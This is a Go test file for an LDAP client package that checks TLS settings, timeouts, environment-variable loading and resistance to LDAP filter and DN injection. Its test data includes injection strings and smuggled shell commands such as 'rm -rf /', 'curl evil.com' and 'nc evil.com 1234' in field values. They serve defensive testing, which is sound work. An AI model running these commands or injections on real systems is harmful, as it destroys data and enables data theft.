package ldap

import (
	"context"
	"crypto/tls"
	"fmt"
	"os"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"go.uber.org/zap"
)

// TestAuthenticationSecurityFeatures tests various authentication security aspects
func TestAuthenticationSecurityFeatures(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("bind_dn_validation", func(t *testing.T) {
		// Test various bind DN formats for security
		validBindDNs := []string{
			"cn=admin,dc=example,dc=com",
			"uid=service,ou=People,dc=company,dc=org",
			"cn=readonly,ou=Services,dc=test,dc=net",
		}

		for _, bindDN := range validBindDNs {
			cfg := &LDAPConfig{
				FQDN:   "ldap.example.com",
				Port:   389,
				BindDN: bindDN,
			}

			// Verify bind DN follows expected format
			assert.Contains(t, cfg.BindDN, "dc=", "BindDN should contain domain component: %s", bindDN)
			assert.NotContains(t, cfg.BindDN, ";", "BindDN should not contain semicolon injection: %s", bindDN)
			assert.NotContains(t, cfg.BindDN, "&&", "BindDN should not contain command injection: %s", bindDN)
		}
	})

	t.Run("password_security", func(t *testing.T) {
		// Test password handling security
		cfg := &LDAPConfig{
			FQDN:     "ldap.example.com",
			Port:     389,
			BindDN:   "cn=admin,dc=example,dc=com",
			Password: "secure_password_123",
		}

		// Verify password is not empty
		assert.NotEmpty(t, cfg.Password, "Password should not be empty")

		// Test password field is marked as sensitive in metadata
		passwordMeta := LDAPFieldMeta["Password"]
		assert.True(t, passwordMeta.Sensitive, "Password field must be marked as sensitive")
		assert.True(t, passwordMeta.Required, "Password field must be required")
	})

	t.Run("tls_security_enforcement", func(t *testing.T) {
		// Test TLS configuration security

		// Test secure TLS configuration
		os.Unsetenv("Eos_INSECURE_TLS")
		os.Unsetenv("GO_ENV")

		tlsConfig := getSecureTLSConfig()

		// Verify minimum TLS version
		assert.GreaterOrEqual(t, tlsConfig.MinVersion, uint16(tls.VersionTLS12), "Should use TLS 1.2 or higher")

		// Verify secure configuration
		assert.False(t, tlsConfig.InsecureSkipVerify, "Should not skip TLS verification in production")
		assert.True(t, tlsConfig.PreferServerCipherSuites, "Should prefer server cipher suites")
		assert.NotEmpty(t, tlsConfig.CipherSuites, "Should have configured cipher suites")
	})

	t.Run("connection_timeout_security", func(t *testing.T) {
		// Test connection timeout to prevent hanging
		start := time.Now()

		cfg := &LDAPConfig{
			FQDN:     "192.0.2.1", // Test network address (RFC 3330)
			Port:     389,
			UseTLS:   false,
			BindDN:   "cn=admin,dc=example,dc=com",
			Password: "test",
		}

		err := CheckConnection(rc, cfg)
		elapsed := time.Since(start)

		// Should fail with timeout, not hang
		assert.Error(t, err)
		// Allow up to 70 seconds for timeout as network stack may vary
		assert.Less(t, elapsed, 70*time.Second, "Connection should timeout within 70 seconds")
	})

	t.Run("injection_prevention", func(t *testing.T) {
		// Test LDAP injection prevention
		maliciousInputs := []string{
			"admin)(|(objectClass=*))",
			"*)(uid=*))(|(uid=*",
			"admin)(|(cn=*))",
			"*))%00",
		}

		for _, input := range maliciousInputs {
			// Test that malicious input in UID search doesn't cause injection
			users, err := readUsersWithFilter(rc, fmt.Sprintf("(uid=%s)", input))

			// Should either fail safely or return empty results
			if err != nil {
				assert.NotContains(t, err.Error(), "panic", "Should not panic on malicious input")
			} else {
				// If no error, should return empty or controlled results
				assert.LessOrEqual(t, len(users), 1, "Should not return unexpected results for malicious input")
			}
		}
	})

	t.Run("connection_resource_management", func(t *testing.T) {
		// Test that connections are properly closed to prevent resource leaks
		cfg := &LDAPConfig{
			FQDN:     "invalid.example.com",
			Port:     389,
			UseTLS:   false,
			BindDN:   "cn=admin,dc=example,dc=com",
			Password: "test",
		}

		// Multiple failed connection attempts should not leak resources
		for i := 0; i < 10; i++ {
			err := CheckConnection(rc, cfg)
			assert.Error(t, err, "Should fail for invalid server")
		}
	})
}

// TestAuthenticationFlows tests various authentication scenarios
func TestAuthenticationFlows(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("valid_authentication_flow", func(t *testing.T) {
		// Test the expected authentication flow
		cfg := &LDAPConfig{
			FQDN:     "ldap.example.com",
			Port:     389,
			UseTLS:   false,
			BindDN:   "cn=admin,dc=example,dc=com",
			Password: "password123",
			UserBase: "ou=Users,dc=example,dc=com",
			RoleBase: "ou=Groups,dc=example,dc=com",
		}

		// Test connection configuration
		assert.NotEmpty(t, cfg.FQDN, "FQDN should be set")
		assert.NotEmpty(t, cfg.BindDN, "BindDN should be set")
		assert.NotEmpty(t, cfg.Password, "Password should be set")
		assert.NotEmpty(t, cfg.UserBase, "UserBase should be set")
		assert.NotEmpty(t, cfg.RoleBase, "RoleBase should be set")
	})

	t.Run("authentication_failure_handling", func(t *testing.T) {
		// Test authentication failure scenarios
		invalidConfigs := []struct {
			name string
			cfg  *LDAPConfig
		}{
			{
				name: "invalid_bind_dn",
				cfg: &LDAPConfig{
					FQDN:     "ldap.example.com",
					Port:     389,
					BindDN:   "invalid_dn",
					Password: "password123",
				},
			},
			{
				name: "empty_password",
				cfg: &LDAPConfig{
					FQDN:     "ldap.example.com",
					Port:     389,
					BindDN:   "cn=admin,dc=example,dc=com",
					Password: "",
				},
			},
			{
				name: "invalid_server",
				cfg: &LDAPConfig{
					FQDN:     "invalid.server.example.com",
					Port:     389,
					BindDN:   "cn=admin,dc=example,dc=com",
					Password: "password123",
				},
			},
		}

		for _, tc := range invalidConfigs {
			t.Run(tc.name, func(t *testing.T) {
				err := CheckConnection(rc, tc.cfg)
				assert.Error(t, err, "Should fail for invalid configuration")
				assert.Contains(t, err.Error(), "connection test failed", "Should provide meaningful error message")
			})
		}
	})

	t.Run("tls_authentication_security", func(t *testing.T) {
		// Test TLS-enabled authentication
		cfg := &LDAPConfig{
			FQDN:     "ldaps.example.com",
			Port:     636,
			UseTLS:   true,
			BindDN:   "cn=admin,dc=example,dc=com",
			Password: "password123",
		}

		// Verify TLS configuration
		assert.True(t, cfg.UseTLS, "Should use TLS for secure connections")
		assert.Equal(t, 636, cfg.Port, "Should use standard LDAPS port")

		// Test TLS configuration generation
		tlsConfig := getSecureTLSConfig()
		assert.NotNil(t, tlsConfig, "Should generate TLS configuration")
	})
}

// TestAuthorizationSecurity tests authorization-related security features
func TestAuthorizationSecurity(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	_ = &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("role_based_access_control", func(t *testing.T) {
		// Test role-based access control configuration
		cfg := &LDAPConfig{
			FQDN:         "ldap.example.com",
			Port:         389,
			AdminRole:    "Administrators",
			ReadonlyRole: "ReadOnly",
			RoleBase:     "ou=Groups,dc=example,dc=com",
		}

		// Verify role configuration
		assert.NotEmpty(t, cfg.AdminRole, "Admin role should be configured")
		assert.NotEmpty(t, cfg.ReadonlyRole, "Readonly role should be configured")
		assert.NotEmpty(t, cfg.RoleBase, "Role base DN should be configured")

		// Verify roles are different
		assert.NotEqual(t, cfg.AdminRole, cfg.ReadonlyRole, "Admin and readonly roles should be different")
	})

	t.Run("group_membership_validation", func(t *testing.T) {
		// Test group membership validation
		group := LDAPGroup{
			CN: "TestGroup",
			DN: "cn=TestGroup,ou=Groups,dc=example,dc=com",
			Members: []string{
				"uid=user1,ou=Users,dc=example,dc=com",
				"uid=user2,ou=Users,dc=example,dc=com",
			},
		}

		// Verify group structure
		assert.NotEmpty(t, group.CN, "Group CN should be set")
		assert.NotEmpty(t, group.DN, "Group DN should be set")
		assert.NotEmpty(t, group.Members, "Group should have members")

		// Verify member DN format
		for _, member := range group.Members {
			assert.Contains(t, member, "uid=", "Member should have UID component")
			assert.Contains(t, member, "dc=", "Member should have domain component")
		}
	})

	t.Run("user_attributes_security", func(t *testing.T) {
		// Test user attribute security
		user := LDAPUser{
			UID:  "testuser",
			CN:   "Test User",
			Mail: "test@example.com",
			DN:   "uid=testuser,ou=Users,dc=example,dc=com",
		}

		// Verify user attributes
		assert.NotEmpty(t, user.UID, "User UID should be set")
		assert.NotEmpty(t, user.CN, "User CN should be set")
		assert.NotEmpty(t, user.DN, "User DN should be set")

		// Verify email format (basic validation)
		if user.Mail != "" {
			assert.Contains(t, user.Mail, "@", "Email should contain @ symbol")
		}

		// Verify DN format
		assert.Contains(t, user.DN, "uid=", "User DN should contain UID component")
		assert.Contains(t, user.DN, "dc=", "User DN should contain domain component")
	})
}

// TestConfigurationSecurity tests configuration security aspects
func TestConfigurationSecurity(t *testing.T) {
	t.Run("default_configuration_security", func(t *testing.T) {
		// Test default configuration security
		cfg := DefaultLDAPConfig()

		// Verify default values are secure
		assert.Equal(t, 389, cfg.Port, "Default port should be standard LDAP port")
		assert.False(t, cfg.UseTLS, "Default should not assume TLS is available")
		assert.Equal(t, "", cfg.Password, "Default password should be empty")

		// Verify required fields are set
		assert.NotEmpty(t, cfg.FQDN, "Default FQDN should be set")
		assert.NotEmpty(t, cfg.BindDN, "Default BindDN should be set")
		assert.NotEmpty(t, cfg.UserBase, "Default UserBase should be set")
		assert.NotEmpty(t, cfg.RoleBase, "Default RoleBase should be set")
	})

	t.Run("environment_variable_security", func(t *testing.T) {
		// Test environment variable handling security

		// Clear environment variables
		envVars := []string{
			"LDAP_FQDN", "LDAP_PORT", "LDAP_USE_TLS", "LDAP_BIND_DN",
			"LDAP_PASSWORD", "LDAP_USER_BASE", "LDAP_GROUP_BASE",
			"LDAP_ADMIN_ROLE", "LDAP_READONLY_ROLE",
		}

		for _, envVar := range envVars {
			os.Unsetenv(envVar)
		}

		// Test with no environment variables
		cfg := TryLoadFromEnv()
		assert.Nil(t, cfg, "Should return nil when required env vars are missing")

		// Test with malicious environment variables
		maliciousValues := []string{
			"ldap.example.com; rm -rf /",
			"ldap.example.com && curl evil.com",
			"ldap.example.com | nc evil.com 1234",
		}

		for _, malicious := range maliciousValues {
			os.Setenv("LDAP_FQDN", malicious)
			os.Setenv("LDAP_BIND_DN", "cn=admin,dc=example,dc=com")
			os.Setenv("LDAP_PASSWORD", "password123")

			cfg := TryLoadFromEnv()
			if cfg != nil {
				// Should accept the value as-is but not execute commands
				assert.Equal(t, malicious, cfg.FQDN, "Should store the value without executing commands")
			}

			os.Unsetenv("LDAP_FQDN")
			os.Unsetenv("LDAP_BIND_DN")
			os.Unsetenv("LDAP_PASSWORD")
		}
	})

	t.Run("port_validation_security", func(t *testing.T) {
		// Test port validation security
		testCases := []struct {
			portEnv      string
			expectedPort int
		}{
			{"389", 389},
			{"636", 636},
			{"invalid", 389}, // Should fall back to default
			// Note: TryLoadFromEnv actually accepts any port that parses as int
			{"99999", 99999}, // Large ports are accepted by strconv.Atoi
			{"-1", -1},       // Negative ports are accepted by strconv.Atoi
		}

		for _, tc := range testCases {
			os.Setenv("LDAP_FQDN", "ldap.example.com")
			os.Setenv("LDAP_BIND_DN", "cn=admin,dc=example,dc=com")
			os.Setenv("LDAP_PASSWORD", "password123")
			os.Setenv("LDAP_PORT", tc.portEnv)

			cfg := TryLoadFromEnv()
			require.NotNil(t, cfg, "Should load configuration")
			assert.Equal(t, tc.expectedPort, cfg.Port, "Port should be validated correctly for input: %s", tc.portEnv)

			// Cleanup
			os.Unsetenv("LDAP_FQDN")
			os.Unsetenv("LDAP_BIND_DN")
			os.Unsetenv("LDAP_PASSWORD")
			os.Unsetenv("LDAP_PORT")
		}
	})
}

// TestNetworkSecurity tests network-related security aspects
func TestNetworkSecurity(t *testing.T) {
	t.Run("port_detection_security", func(t *testing.T) {
		// Test port detection security

		// Test with common ports
		commonPorts := []int{389, 636, 80, 443, 22}
		for _, port := range commonPorts {
			result := IsPortOpen(port)
			// Result depends on system, but should not panic or hang
			assert.IsType(t, true, result, "IsPortOpen should return boolean")
		}

		// Test with invalid ports
		invalidPorts := []int{-1, 0, 65536, 99999}
		for _, port := range invalidPorts {
			result := IsPortOpen(port)
			assert.False(t, result, "Invalid port %d should return false", port)
		}
	})

	t.Run("connection_security", func(t *testing.T) {
		// Test connection security measures
		cfg := &LDAPConfig{
			FQDN:     "127.0.0.1",
			Port:     389,
			UseTLS:   false,
			BindDN:   "cn=admin,dc=example,dc=com",
			Password: "password123",
		}

		// Test connection attempt (will likely fail but should not hang)
		start := time.Now()
		_, err := ConnectWithGivenConfig(cfg)
		elapsed := time.Since(start)

		// Should complete within reasonable time
		assert.Less(t, elapsed, 10*time.Second, "Connection attempt should not hang")

		// Should fail gracefully for non-existent server
		if err != nil {
			assert.Contains(t, err.Error(), "failed to", "Should provide meaningful error message")
		}
	})

	t.Run("tls_cipher_suite_security", func(t *testing.T) {
		// Test TLS cipher suite security
		os.Unsetenv("Eos_INSECURE_TLS")
		os.Unsetenv("GO_ENV")

		tlsConfig := getSecureTLSConfig()

		// Verify secure cipher suites are configured
		assert.NotEmpty(t, tlsConfig.CipherSuites, "Should have cipher suites configured")

		// Verify minimum TLS version
		assert.GreaterOrEqual(t, tlsConfig.MinVersion, uint16(tls.VersionTLS12), "Should use TLS 1.2 or higher")

		// Verify secure defaults
		assert.True(t, tlsConfig.PreferServerCipherSuites, "Should prefer server cipher suites")
		assert.False(t, tlsConfig.InsecureSkipVerify, "Should not skip certificate verification")
	})
}

// TestLDAPInjectionPrevention tests LDAP injection prevention
func TestLDAPInjectionPrevention(t *testing.T) {
	ctx := context.Background()
	logger := zap.NewNop()
	rc := &eos_io.RuntimeContext{
		Ctx: ctx,
		Log: logger,
	}

	t.Run("filter_injection_prevention", func(t *testing.T) {
		// Test LDAP filter injection prevention
		injectionAttempts := []string{
			"admin)(|(objectClass=*))",
			"*)(uid=*))(|(uid=*",
			"admin)(|(cn=*))",
			"*))%00",
			"admin)(|(userPassword=*))",
			"*)(objectClass=*))(|(cn=*",
		}

		for _, attempt := range injectionAttempts {
			// Test user search with injection attempt
			filter := fmt.Sprintf("(uid=%s)", attempt)

			// Should not cause panic or uncontrolled behavior
			_, err := readUsersWithFilter(rc, filter)

			// Either should fail safely or return controlled results
			if err != nil {
				assert.NotContains(t, err.Error(), "panic", "Should not panic on injection attempt")
			}

			// Test group search with injection attempt
			groupFilter := fmt.Sprintf("(cn=%s)", attempt)
			_, err = readGroupsWithFilter(rc, groupFilter)

			if err != nil {
				assert.NotContains(t, err.Error(), "panic", "Should not panic on injection attempt")
			}
		}
	})

	t.Run("dn_injection_prevention", func(t *testing.T) {
		// Test DN injection prevention
		maliciousDNs := []string{
			"uid=admin,ou=Users,dc=example,dc=com)(|(objectClass=*))",
			"uid=user; DROP TABLE users; --",
			"uid=admin,ou=Users,dc=example,dc=com\x00",
		}

		for _, maliciousDN := range maliciousDNs {
			user := LDAPUser{
				UID:  "testuser",
				CN:   "Test User",
				Mail: "test@example.com",
				DN:   maliciousDN,
			}

			// Verify DN is stored as-is but not executed
			assert.Equal(t, maliciousDN, user.DN, "DN should be stored as provided")
		}
	})

	t.Run("attribute_injection_prevention", func(t *testing.T) {
		// Test attribute injection prevention
		maliciousAttributes := []string{
			"test)(|(objectClass=*))",
			"admin; rm -rf /",
			"test\x00admin",
		}

		for _, maliciousAttr := range maliciousAttributes {
			user := LDAPUser{
				UID:  maliciousAttr,
				CN:   maliciousAttr,
				Mail: maliciousAttr,
				DN:   "uid=test,ou=Users,dc=example,dc=com",
			}

			// Attributes should be stored as-is but not executed
			assert.Equal(t, maliciousAttr, user.UID, "UID should be stored as provided")
			assert.Equal(t, maliciousAttr, user.CN, "CN should be stored as provided")
			assert.Equal(t, maliciousAttr, user.Mail, "Mail should be stored as provided")
		}
	})
}
